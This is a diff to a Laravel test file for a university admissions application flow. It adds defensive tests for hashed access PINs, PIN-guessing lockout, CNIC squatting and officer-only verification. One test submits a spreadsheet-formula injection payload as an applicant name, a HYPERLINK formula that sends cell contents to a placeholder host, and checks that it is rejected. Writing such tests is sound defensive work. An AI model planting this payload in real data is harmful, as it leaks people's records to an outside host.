@@ -59,7 +59,11 @@ class ApplyFlowTest extends TestCase
         $this->assertSame('draft', $app->status);
         $this->assertSame('37405-1234567-1', $app->cnic);
 
-        $this->get(route('apply.documents', $app->tracking_no))->assertOk()->assertSee($app->access_pin);
+        // The PIN is stored hashed; the plain PIN lives only in this browser's session.
+        $pin = session('apply_pins')[$app->tracking_no];
+        $this->assertMatchesRegularExpression('/^\d{6}$/', $pin);
+        $this->assertNotSame($pin, $app->fresh()->getRawOriginal('access_pin'));
+        $this->get(route('apply.documents', $app->tracking_no))->assertOk()->assertSee($pin);
 
         // Review is blocked until required documents are uploaded
         $this->get(route('apply.review', $app->tracking_no))->assertRedirect(route('apply.documents', $app->tracking_no));
@@ -94,7 +98,8 @@ class ApplyFlowTest extends TestCase
         ])->assertRedirect(route('apply.done', $app->tracking_no));
 
         $app->refresh();
-        $this->assertSame('verified', $app->status);
+        // AI says "clear", but only an officer can mark it verified.
+        $this->assertSame('under_review', $app->status);
         $this->assertSame('clear', $app->verification_status);
         $this->assertNotNull($app->merit_score);
         $this->get(route('apply.done', $app->tracking_no))->assertOk()->assertSee($app->tracking_no);
@@ -132,23 +137,65 @@ class ApplyFlowTest extends TestCase
     public function test_drafts_need_tracking_number_and_pin_from_another_browser(): void
     {
         $app = $this->startApplication();
+        $pin = session('apply_pins')[$app->tracking_no];
         $this->flushSession();
 
         $this->get(route('apply.documents', $app->tracking_no))->assertRedirect();
-        $this->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => '000000'])->assertSessionHasErrors('pin');
-        $this->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $app->access_pin])
+        $this->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $pin === '000000' ? '111111' : '000000'])->assertSessionHasErrors('pin');
+        $this->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $pin])
             ->assertRedirect(route('apply.documents', $app->tracking_no));
         $this->get(route('apply.documents', $app->tracking_no))->assertOk();
     }
 
-    public function test_duplicate_cnic_cannot_start_a_second_application(): void
+    public function test_pin_guessing_locks_the_tracking_number_whatever_the_ip(): void
     {
-        $this->startApplication();
+        $app = $this->startApplication();
+        $pin = session('apply_pins')[$app->tracking_no];
+        $this->flushSession();
+        $wrong = $pin === '000000' ? '111111' : '000000';
+
+        foreach (range(1, 5) as $i) {
+            $this->withServerVariables(['REMOTE_ADDR' => "10.0.0.{$i}"])
+                ->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $wrong])->assertSessionHasErrors('pin');
+        }
+        // Even the right PIN from a fresh IP is refused while locked.
+        $this->withServerVariables(['REMOTE_ADDR' => '10.0.0.99'])
+            ->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $pin])
+            ->assertSessionHasErrors(['pin' => 'Too many wrong PINs for this tracking number. Try again in 15 minutes, or contact the admissions office.']);
+    }
+
+    public function test_submitted_cnic_blocks_a_second_application_without_revealing_its_tracking_number(): void
+    {
+        $first = $this->startApplication();
+        $first->update(['status' => 'submitted']);
+        $this->flushSession();
+
         $this->post(route('apply.store'), [
             'program_id' => $this->bs->id, 'name' => 'Someone Else', 'cnic' => '37405-1234567-1',
             'phone' => '03001234567', 'email' => 'x@gmail.com', 'quota' => 'open',
         ])->assertSessionHasErrors('cnic');
+        $this->assertStringNotContainsString($first->tracking_no, session('errors')->first('cnic'));
         $this->assertSame(1, AdmissionApplication::count());
+    }
+
+    public function test_a_draft_cannot_squat_someone_elses_cnic(): void
+    {
+        $this->startApplication();   // an attacker opens a draft with the victim's CNIC
+        $this->flushSession();
+
+        $this->post(route('apply.store'), [
+            'program_id' => $this->bs->id, 'name' => 'Real Applicant', 'cnic' => '37405-1234567-1',
+            'phone' => '03001234567', 'email' => 'real@gmail.com', 'quota' => 'open',
+        ])->assertSessionHasNoErrors();
+        $this->assertSame(2, AdmissionApplication::count());
+    }
+
+    public function test_names_with_spreadsheet_formulas_are_rejected(): void
+    {
+        $this->post(route('apply.store'), [
+            'program_id' => $this->bs->id, 'name' => '=HYPERLINK("http://x.test/?"&C2,"Ali")', 'cnic' => '37405-1234567-1',
+            'phone' => '03001234567', 'email' => 'x@gmail.com', 'quota' => 'open',
+        ])->assertSessionHasErrors('name');
     }
 
     public function test_closed_cycle_shows_closed_page_and_blocks_new_applications(): void
